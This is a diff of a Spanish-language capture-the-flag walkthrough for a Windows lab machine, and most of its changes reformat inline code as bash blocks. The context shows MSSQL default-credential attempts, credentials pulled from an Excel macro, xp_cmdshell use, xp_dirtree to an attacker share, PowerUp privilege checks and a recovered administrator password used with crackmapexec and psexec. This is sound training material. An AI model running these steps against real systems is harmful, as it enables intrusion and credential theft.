@@ -89,7 +89,11 @@ Que vemos:
 
 ### Conexion por MSSQL credenciales por defecto {-}
 
-Intentamos conectarnos al servicio MSQL con credenciales por defecto usando `mssqlclient.py`
+Intentamos conectarnos al servicio MSQL con credenciales por defecto usando 
+```bash
+ mssqlclient.py 
+```
+
 
 ```bash
 locate mssqlclient.py
@@ -98,7 +102,11 @@ locate mssqlclient.py
 ```
 
 El usuario por defecto **sa** no nos va con la contraseña **sa** y sin contraseña. Intentamos volverlo a intentar
-con el parametro `-windows-auth`
+con el parametro 
+```bash
+ -windows-auth 
+```
+
 
 ```bash
 /usr/bin/mssqlclient.py WORKGROUP/sa:sa@10.10.10.125 -windows-auth
@@ -137,7 +145,11 @@ Utilizacion
 olevba Currency\ Volume\ Report.xlsm
 ```
 
-Aqui olevba nos muestra una macro `ThisWorkbook.cls` y credenciales de base de datos en texto claro.
+Aqui olevba nos muestra una macro 
+```bash
+ ThisWorkbook.cls 
+```
+ y credenciales de base de datos en texto claro.
 
 Antes de intentar conectarnos al servicio MSSQL, validamos las credenciales con crackmapexec.
 
@@ -172,7 +184,11 @@ password: PcwTW1HRwryjc$c6
 SQL> 
 ```
 
-Con MSSQL hay un comando que se llama `xp_cmdshell` que nos permite enviar comandos a nivel de sistema
+Con MSSQL hay un comando que se llama 
+```bash
+ xp_cmdshell 
+```
+ que nos permite enviar comandos a nivel de sistema
 
 ```bash
 xp_cmdshell "whoami"
@@ -190,7 +206,11 @@ sp_configure "show advanced", 1
 
 Como aqui vemos que el usuario reporting no tiene derechos de lanzar comandos o modificar las configuraciones, lo que vamos a intentar
 es entablar una conexion a nivel de red que el proprio usuario reporting no puede hacer porque es usuario local. Hay un comando de
-MSSQL llamado `xp_dirtree` que permite buscar ficheros en recursos compartidos
+MSSQL llamado 
+```bash
+ xp_dirtree 
+```
+ que permite buscar ficheros en recursos compartidos
 
 1. En la maquina de atacante, creamos un recurso compartido con smb
 
@@ -258,7 +278,11 @@ Aqui tampoco nos funciona.
 SQL> 
 ```
 
-Intentamos el comando `xp_cmdshell`
+Intentamos el comando 
+```bash
+ xp_cmdshell 
+```
+
 
 ```bash
 xp_cmdshell "whoami"
@@ -353,7 +377,15 @@ whoami /priv
 SEImpersonatePrivilege
 ```
 
-Aqui ya vemos que podemos escalar privilegios con `JuicyPotatoe.exe` o `RotenPotatoe.exe` pero S4vitar nos
+Aqui ya vemos que podemos escalar privilegios con 
+```bash
+ JuicyPotatoe.exe 
+```
+ o 
+```bash
+ RotenPotatoe.exe 
+```
+ pero S4vitar nos
 muestra aqui una via alternativa de escalar privilegios en esta maquina.
 
 ```bash
@@ -363,8 +395,16 @@ cd Privesc
 vi PowerUp.ps1
 ```
 
-Aqui vamos a hacer lo mismo que con el fichero `PS.ps1`. En vez de enviarlo y despues invocarlo, matamos dos pajaros
-de un tiro y añadimos el **Invoke** al final del fichero `PowerUp.ps1`
+Aqui vamos a hacer lo mismo que con el fichero 
+```bash
+ PS.ps1 
+```
+. En vez de enviarlo y despues invocarlo, matamos dos pajaros
+de un tiro y añadimos el **Invoke** al final del fichero 
+```bash
+ PowerUp.ps1 
+```
+
 
 ```bash
 Invoke-AllChecks
@@ -394,7 +434,11 @@ Este script nos reporta un monton de cosas y aqui podemos ver
 crackmapexec smb 10.10.10.125 -u 'Administrator' -p 'MyUnclesAreMarioAndLuigi!!1!' -d WORKGROUP
 ```
 
-Ya vemos un **[+]** y un **(Pwn3d)**. Quiere decir que podemos connectarnos al systema con `psexec`
+Ya vemos un **[+]** y un **(Pwn3d)**. Quiere decir que podemos connectarnos al systema con 
+```bash
+ psexec 
+```
+
 
 ### Conexion con psexec.py {-}
 
